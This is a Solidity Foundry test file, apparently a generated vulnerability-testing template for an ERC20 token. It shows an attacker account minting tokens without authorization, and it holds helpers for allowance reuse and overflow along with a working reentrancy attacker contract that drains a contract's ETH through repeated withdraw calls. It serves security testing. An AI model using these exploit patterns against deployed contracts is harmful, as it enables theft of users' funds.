// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {SimpleERC20} from "../src/SimpleERC20.sol";

/**
 * @title GorillaTest
 * @dev Fully-featured vulnerability testing template with all commonly needed presets
 */
contract GorillaTest is Test {
    // Core state variables
    SimpleERC20 public token;
    address public attacker;
    address public victim;
    address public user1;
    address public user2;
    address public owner;
    
    // Initial balances for testing
    uint256 public constant INITIAL_SUPPLY = 1000000 * 10**18;
    uint256 public constant INITIAL_BALANCE = 10000 * 10**18;
    
    function setUp() public {
        // Set up test accounts
        owner = makeAddr("owner");
        attacker = makeAddr("attacker");
        victim = makeAddr("victim");
        user1 = makeAddr("user1");
        user2 = makeAddr("user2");
        
        // Fund all accounts with ETH
        vm.deal(owner, 100 ether);
        vm.deal(attacker, 100 ether);
        vm.deal(victim, 100 ether);
        vm.deal(user1, 100 ether);
        vm.deal(user2, 100 ether);
        
        // Deploy token contract
        vm.prank(owner);
        token = new SimpleERC20("VulnToken", "VULN", 18, INITIAL_SUPPLY / 10**18);
        
        // Distribute tokens to test accounts
        vm.startPrank(owner);
        token.transfer(victim, INITIAL_BALANCE);
        token.transfer(user1, INITIAL_BALANCE);
        token.transfer(user2, INITIAL_BALANCE);
        vm.stopPrank();
        
        // Deposit some ETH to the contract for withdraw tests
        vm.deal(address(token), 50 ether);
    }
    
    function testVulnerability() external {
        console.log("=== Starting Vulnerability Test ===");
        console.log("Token contract:", address(token));
        console.log("Attacker:", attacker);
        console.log("Victim:", victim);
        
        // Record pre-attack state
        uint256 attackerBalanceBefore = token.balanceOf(attacker);
        uint256 victimBalanceBefore = token.balanceOf(victim);
        uint256 contractEthBefore = address(token).balance;
        
        console.log("Before attack - Attacker balance:", attackerBalanceBefore);
        console.log("Before attack - Victim balance:", victimBalanceBefore);
        console.log("Before attack - Contract ETH:", contractEthBefore);
        
        // Template variable injection point - concrete vulnerability testing logic
        vm.prank(attacker);
        token.mint(attacker, 500000 * 10**18);
        
        // Record post-attack state
        uint256 attackerBalanceAfter = token.balanceOf(attacker);
        uint256 victimBalanceAfter = token.balanceOf(victim);
        uint256 contractEthAfter = address(token).balance;
        
        console.log("After attack - Attacker balance:", attackerBalanceAfter);
        console.log("After attack - Victim balance:", victimBalanceAfter);
        console.log("After attack - Contract ETH:", contractEthAfter);
        
        // Template variable injection point - vulnerability verification assertions
        assertTrue(token.balanceOf(attacker) == attackerBalanceBefore + 500000 * 10**18, "Attacker minted tokens without authorization");
        
        console.log("=== Vulnerability Test Completed ===");
    }
    
    // Predefined helper functions
    function _testReentrancyAttack() internal {
        // Helper for reentrancy attack testing
        ReentrancyAttacker attackContract = new ReentrancyAttacker(address(token));
        
        // Provide some tokens to the attack contract
        vm.prank(attacker);
        token.transfer(address(attackContract), 1 ether);
        
        // Execute reentrancy attack
        vm.prank(attacker);
        attackContract.attack();
    }
    
    function _testUnauthorizedMint() internal {
        // Unauthorized mint test
        uint256 mintAmount = 1000000 * 10**18;
        
        vm.prank(attacker);
        token.mint(attacker, mintAmount);
    }
    
    function _testAllowanceBypass() internal {
        // Allowance bypass test
        uint256 transferAmount = 1000 * 10**18;
        
        // Victim approves a small allowance for attacker
        vm.prank(victim);
        token.approve(attacker, transferAmount);
        
        // Try to reuse the same allowance multiple times
        vm.startPrank(attacker);
        token.transferFrom(victim, attacker, transferAmount);
        token.transferFrom(victim, attacker, transferAmount); // Should fail but may succeed
        vm.stopPrank();
    }
    
    function _testIntegerOverflow() internal {
        // Integer overflow test
        uint256 maxUint = type(uint256).max;
        
        vm.prank(attacker);
        // Try to trigger overflow
        try token.transfer(victim, maxUint) {
            // If it succeeds, an overflow vulnerability may exist
        } catch {
            // Expected to fail
        }
    }
    
    // Helper function
    function _logBalances() internal view {
        console.log("Owner balance:", token.balanceOf(owner));
        console.log("Attacker balance:", token.balanceOf(attacker));
        console.log("Victim balance:", token.balanceOf(victim));
        console.log("User1 balance:", token.balanceOf(user1));
        console.log("User2 balance:", token.balanceOf(user2));
        console.log("Contract ETH balance:", address(token).balance);
    }
}

// Reentrancy attack contract
contract ReentrancyAttacker {
    SimpleERC20 public token;
    uint256 public attackCount;
    uint256 public constant MAX_ATTACKS = 3;
    
    constructor(address _token) {
        token = SimpleERC20(payable(_token));
    }
    
    function attack() external {
        // Begin reentrancy attack
        token.withdraw();
    }
    
    receive() external payable {
        // Reentrancy logic
        if (attackCount < MAX_ATTACKS && address(token).balance > 0) {
            attackCount++;
            token.withdraw();
        }
    }
}